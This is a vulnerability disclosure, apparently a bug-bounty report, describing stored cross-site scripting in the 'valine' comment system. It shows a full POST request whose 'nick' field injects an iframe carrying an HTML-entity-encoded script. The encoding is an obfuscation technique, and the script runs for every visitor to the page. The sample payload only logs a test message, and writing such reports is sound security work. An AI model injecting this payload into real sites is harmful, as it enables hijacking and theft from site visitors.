# Description

`valine` is vulnerable to `Cross-Site Scripting (XSS)`.

# Steps To Reproduce
1. Change the request body for adding comment as follows:

```
POST /1.1/classes/Comment HTTP/1.1
Host: XXX.api.lncld.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=UTF-8
Content-Length: 640
Origin: https://xxx.yyy.zzz
```

```json
{
    "comment": "Good! \n",
    "nick": "Alex\"</a><iframe width=1 height=1 srcdoc=\"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#99;&#111;&#110;&#115;&#111;&#108;&#101;&#46;&#108;&#111;&#103;&#40;&#39;&#83;&#116;&#111;&#114;&#101;&#100;&#32;&#88;&#83;&#83;&#32;&#116;&#101;&#115;&#116;&#32;&#112;&#97;&#115;&#115;&#101;&#100;&#39;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\"",
    "mail": "",
    "link": "",
    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Fire-fox/82.0",
    "url": "/en/prepare/prepare/",
    "QQAvatar": "",
    "ip": "1.2.3.4",
    "insertedAt": {
        "__type": "Date",
        "iso": "2020-11-04T08:30:47.526Z"
    },
    "ACL": {
        "*": {
            "read": true
        }
    }
}
```

2. This malicious request adds new comment. The HTML-encoded value of srcdoc attribute in request is:
   `<script>console.log('Stored XSS test passed');</script>`
3. The injected JavaScript executes on the vulnerable web-page for every visitor.
